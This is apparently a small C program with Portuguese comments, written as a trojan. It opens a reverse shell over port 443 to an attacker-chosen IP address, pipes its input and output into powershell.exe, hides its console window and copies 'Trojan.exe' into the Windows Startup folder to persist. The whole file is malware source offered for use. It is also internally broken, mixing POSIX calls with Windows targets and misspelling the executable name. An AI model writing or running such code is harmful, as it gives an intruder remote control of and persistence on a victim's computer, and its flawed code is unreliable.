#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup") //ocultar a janela do DOS, mas depende do compilador!

int main(void){
    int port = 443;
    struct sockaddr_in revshell; //nome de nossa estrutura

    int sock = socket(AF_INET, SOCK_STREAM, 0); //definindo o socket informando o tipo de conexão TCP
    revshell.sin_family = AF_INET; // definindo a familia do socket
    revshell.sin_port = htons(port); //recebe um valor em 16 bits, e devolve em 16 bits
    revshell.sin_addr.s_addr = inet_addr("0.0.0.0"); // (seu endereço de ip) 

    connect(sock, (struct sockaddr *) &revshell, sizeof(revshell));
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char * const argv[] = {"powershel.exe", NULL};
    execve("powershell.exe", argv, NULL);

    system("copy Trojan.exe %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");// executando o comando para se auto copiar 

    return 0;       
}
